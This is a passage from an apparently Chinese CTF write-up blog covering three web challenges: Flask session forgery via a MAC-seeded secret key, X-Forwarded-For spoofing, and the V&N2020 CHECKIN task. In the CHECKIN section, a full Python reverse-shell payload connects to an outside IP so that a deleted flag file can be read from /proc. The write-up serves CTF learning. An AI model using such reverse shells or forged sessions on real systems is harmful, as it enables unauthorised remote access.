<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www-data'</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'^file.*'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        n <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>
        <span class="token keyword">if</span> m <span class="token keyword">or</span> n<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'No Hack'</span>
        res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'no response'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'fuck'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Access denied'</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
        debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
        host<span class="token operator">=</span><span class="token string">&quot;0.0.0.0&quot;</span>
    <span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>在flag路由下，只有session中的username = fuck，才可以得到flag，估计又是考flask的session伪造。</p> <p>老套路，看一下有无泄漏secret_key：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212259.png" alt="image-20200727210827575"></p> <ul><li>uuid.getnode()：获取当前系统的MAC地址，返回值是十进制</li></ul> <p>以MAC地址作为随机数的种子，既然随机数的种子是固定的，那么生成的随机数也是有规律的，所以secret_key是可以得出来的。</p> <ul><li>Linux的MAC地址存储位置：/sys/class/net/eth0/address</li></ul> <p>读一下MAC地址：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727211129.png" alt="image-20200727211129851"></p> <ul><li><p>十六进制：02:42:ae:02:89:3c -&gt; 0x0242ae02893c</p></li> <li><p>对应十进制：2485410498876</p></li></ul> <p>写脚本来获取随机数(py2环境)：</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212315.png" alt="image-20200727211938423" style="zoom:50%;"> <p>利用得到的随机数来解码session：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212021.png" alt="image-20200727212021464"></p> <p>再伪造seesion：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212148.png" alt="image-20200727212148684"></p> <p>改一下cookie，拿到flag：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212207.png" alt="image-20200727212207683"></p> <h3 id="pywebsite"><a href="#pywebsite" class="header-anchor">#</a> PYWebsite</h3> <p><strong>考点：</strong></p> <ul><li><strong>XFF头IP伪造</strong></li></ul> <p>买flag发现要授权码，F12一下发现授权码是前端验证的，验证成功之后会跳转到./flag.php</p> <img src="https://i.loli.net/2020/07/30/hSZLbtfpAeqYMTH.png" alt="image-20200730145534334" style="zoom:80%;"> <p>那我们就手动跳转吧2333</p> <img src="https://i.loli.net/2020/07/30/7iJHIMRUz8metdg.png" alt="image-20200730145630326" style="zoom:33%;"> <p>记录了购买者和自己的IP，很明显的XFF头伪造题目了，直接伪造127.0.0.1就能拿到flag</p> <img src="https://i.loli.net/2020/07/30/8NBzthf1IHsErxc.png" alt="image-20200730145753180" style="zoom:50%;"> <h3 id="v-n2020-公开赛-checkin"><a href="#v-n2020-公开赛-checkin" class="header-anchor">#</a> [V&amp;N2020 公开赛]CHECKIN</h3> <p><strong>考点：</strong></p> <ul><li><strong>Linux恢复误删文件</strong></li> <li><strong>python反弹shell</strong></li></ul> <p>**知识点：在Linux系统下，如果打开了一个文件没有关闭的话，即使将文件删除，也可以在<code>/proc/[pid]/fd/</code>这个目录下看到该文件的内容。**其实，<code>/proc/pid/fd/</code>这个目录包含了进程打开文件的文件描述符，这些描述符是指向实际文件的符号链接。具体可以参考这篇文章：<a href="https://www.jianshu.com/p/662293f12a47" target="_blank" rel="noopener noreferrer">Linux恢复误删除的文件或者目录<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>题目直接给了源码</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> os

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

flag_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;flag.txt&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span>

<span class="token comment"># flag = flag_file.read()</span>
<span class="token comment"># flag_file.close()</span>
<span class="token comment">#</span>
<span class="token comment"># @app.route('/flag')</span>
<span class="token comment"># def flag():</span>
<span class="token comment">#     return flag</span>
<span class="token comment">## want flag? naive!</span>

<span class="token comment"># You will never find the thing you want:) I think</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">&quot;rm -f flag.txt&quot;</span><span class="token punctuation">)</span>
    exec_cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">&quot;1&quot;</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;app.py&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>题目告诉我们flag在<code>flag.txt</code>中，在<code>/shell</code>路由下存在执行系统命令的功能，但是只会回显<code>1</code>，并且每次进入该路由下都会将flag.txt删除。</p> <p>但是题目是在没有将<code>flag.txt</code>关闭的情况下直接删除的，结合我们在一开始就说的知识点，可以进行反弹shell，然后去<code>/proc/[pid]/fd/</code>这个目录下找到flag.txt的符号链接，通过<code>cat</code>该符号链接，就能得到flag.txt的内容。</p> <p>用小号在BUUOJ的Basic分区开一台Linux主机，用ssh远程登录</p> <p><code>ssh -p 28624 root@node3.buuoj.cn</code></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803173824.png" alt="image-20200803173817343"></p> <p>查看ip地址并监听2333端口</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803174113.png" alt="image-20200803174113282"></p> <p>在<code>/shell</code>路由下反弹shell，由于是flask框架，考虑使用python反弹shell，payload如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">/</span>shell?c<span class="token operator">=</span>python3 <span class="token operator">-</span>c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('174.2.189.144',2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>反弹shell成功</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803174943.png" alt="image-20200803174943180"></p> <p>在<code>/prco/[pid]/fd/</code>目录下寻找flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200803175207.png" alt="image-20200803175207894"></p></div></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=WP" title="标签">#WP</a></div> <!----></div> <div class="page-nav-wapper"><!----> <!----></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMI与JNDI（一）</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>谈一谈Java动态加载字节码的方式</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/9.e2574eb5.js" defer></script>
  </body>
</html>